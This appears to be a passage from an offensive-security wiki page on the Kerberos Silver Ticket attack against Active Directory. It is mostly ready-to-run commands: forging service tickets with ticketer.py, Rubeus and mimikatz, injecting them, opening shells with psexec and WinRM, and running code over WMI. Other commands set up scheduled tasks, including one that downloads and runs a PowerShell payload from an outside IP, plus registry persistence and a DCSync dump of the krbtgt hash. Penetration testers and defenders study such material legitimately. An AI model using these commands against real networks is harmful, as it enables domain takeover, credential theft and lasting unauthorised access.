## Silver ticket

The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.

> [!WARNING]
> Silver Tickets are less detectable than Golden Tickets because they only require the **hash of the service account**, not the krbtgt account. However, they are limited to the specific service they target. Moreover, just stealing the password of a user.
Moreover, if you compromise an **account's password with a SPN** you can use that password to create a Silver Ticket impersonating any user to that service.

For ticket crafting, different tools are employed based on the operating system:

### On Linux

```bash
python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```

### On Windows

```bash
# Using Rubeus
## /ldap option is used to get domain data automatically
## With /ptt we already load the tickt in memory
rubeus.exe asktgs /user:<USER> [/rc4:<HASH> /aes128:<HASH> /aes256:<HASH>] /domain:<DOMAIN> /ldap /service:cifs/domain.local /ptt /nowrap /printcmd

# Create the ticket
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"

# Inject the ticket
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```

The CIFS service is highlighted as a common target for accessing the victim's file system, but other services like HOST and RPCSS can also be exploited for tasks and WMI queries.

Using **Rubeus** you may **ask for all** these tickets using the parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624: Account Logon
- 4634: Account Logoff
- 4672: Admin Logon

## Persistence

To avoid machines from rotating their password every 30 days set  `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` or you could set `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` to a bigger value than 30days to indicate the rotation perdiod when the machines password should be rotated.

## Abusing Service tickets

In the following examples lets imagine that the ticket is retrieved impersonating the administrator account.

### CIFS

With this ticket you will be able to access the `C$` and `ADMIN$` folder via **SMB** (if they are exposed) and copy files to a part of the remote filesystem just doing something like:

```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```

You will also be able to obtain a shell inside the host or execute arbitrary commands using **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

With this permission you can generate scheduled tasks in remote computers and execute arbitrary commands:

```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```

### HOST + RPCSS

With these tickets you can **execute WMI in the victim system**:

```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```

Find **more information about wmiexec** in the following page:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

With winrm access over a computer you can **access it** and even get a PowerShell:

```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```

Check the following page to learn **more ways to connect with a remote host using winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Note that **winrm must be active and listening** on the remote computer to access it.

### LDAP

With this privilege you can dump the DC database using **DCSync**:

```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```

**Learn more about DCSync** in the following page:
